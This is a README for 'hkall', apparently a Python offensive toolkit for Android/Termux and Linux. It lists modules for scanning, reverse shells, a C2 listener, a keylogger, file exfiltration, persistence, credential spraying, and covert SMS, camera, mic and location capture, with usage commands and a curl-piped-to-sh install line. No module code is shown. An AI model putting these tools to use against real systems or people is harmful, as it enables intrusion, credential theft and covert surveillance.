# hkall — Modular Offensive Toolkit

Python 3 stdlib toolkit for Android/Termux + Linux. Authorized security testing only.

## Install
```bash
pkg install -y python git termux-api
git clone https://github.com/rizqiwidi/hkall.git
cd hkall && chmod +x hkall.py
python hkall.py
```
Or: `curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh`

## TUI — 21 builtin modules
```
  [1] Port scanner          [2] Web enumerator       [3] DNS / banner lookup
  [4] Subdomain brute DNS   [5] Reverse shell gen    [6] C2 listener (multi-session)
  [7] Keylogger             [8] Exfil client         [9] Exfil server
 [10] Android payload     [11] Shell payload var  [12] LAN host discoverer
 [13] ARP scan            [14] Wifi audit         [15] Persistence
 [16] Device ops          [17] HTTP static server [18] Web form spray
 [19] Config / profile    [20] History (results)  [21] Exit
```

## CLI one-shot
```bash
python hkall.py --list
python hkall.py -m scan --host 192.168.1.5 --ports 1-1000
python hkall.py -m scan --host x.x.x.x --ports 445,3389 --out scan.txt
python hkall.py -m enum --host http://example.com
python hkall.py -m payload --host 1.2.3.4 --port 8443
python hkall.py -m history
python hkall.py -m cfg
python hkall.py -m c2 --port 4444
python hkall.py -m subd --host example.com
python hkall.py -m lan --cidr 192.168.1.0/24
python hkall.py -m arp --cidr 192.168.1.0/24
python hkall.py -m wifi
python hkall.py -m persist
python hkall.py -m spray --host https://login.example.com
```

## Module reference

| key | name | what it does |
|-----|------|-------------|
| scan | Port scanner | TCP connect scan, optional banner grab |
| enum | Web enumerator | headers, emails, secrets, form count |
| whois | DNS lookup | A/AAAA records, reverse PTR |
| subd | Subdomain brute | DNS wordlist scan, multi-threaded |
| shell | Shell generator | py/bash/nc/sh/php one-liners |
| c2 | C2 listener | multi-session, XOR stream obfuscation |
| keylog | Keylogger | raw tty capture → `data/keys.log` |
| exfil | Exfil client | send file to `recv` listener |
| recv | Exfil server | receive file from `exfil` client |
| payload | Payload builder | Python reconnect shell (plain or XOR) |
| exe2 | Shell variants | Android termux / Linux one-liners |
| lan | LAN discoverer | probe CIDR 22/80/135/139/443/445/3389 |
| arp | ARP scan | raw socket ARP sweep (root, Linux) |
| wifi | Wifi audit | scaninfo + connectioninfo via termux-api |
| persist | Persistence | boot script + shell hook (opt-in) |
| ops | Device ops | battery, sms, camera, mic, location, vibrate, clipboard |
| serve | HTTP server | static file server on port 8080 |
| spray | Credential spray | wordlist brute-force web login forms |
| cfg | Config profile | set host/port/cidr defaults (persisted) |
| history | History | view sqlite result store `data/rs.db` |

## C2 usage
```bash
python hkall.py -m c2 --port 4444
```
Session commands inside listener:
```
sessions          list connected shells
use S1            select session 1
kill S1           drop session
<cmd>             run on selected session
exit              stop listener
```
**Obfuscation**: set `obfuscate: true` in `config.json`, then build payload with `y`. Client and server XOR stream match.

## Plugins
Drop `.py` into `modules/`:
```python
def mod_mymod():
    print("hello from plugin")
PLUGIN = {"mymod": ("My module", mod_mymod, True)}
```
Plugins auto-loaded, appear in TUI and CLI. Sample: `modules/hello.py`.

## Data / artifacts
- `data/rs.db` — sqlite history (kind, target, ts, data)
- `data/keys.log` — keylogger capture
- `data/payload.py` — built payload
- `data/cam_*.jpg` — camera capture
- `data/mic_*.m4a` — mic recording
- `wordlist.txt` — password wordlist for spray
- `subd.txt` — subdomain wordlist

## Config
Defaults stored in `config.json`. Edit manually or use `cfg` module:
```json
{"host": "1.2.3.4", "port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24"}
```

## Legal
Authorized testing only. You own the consequences.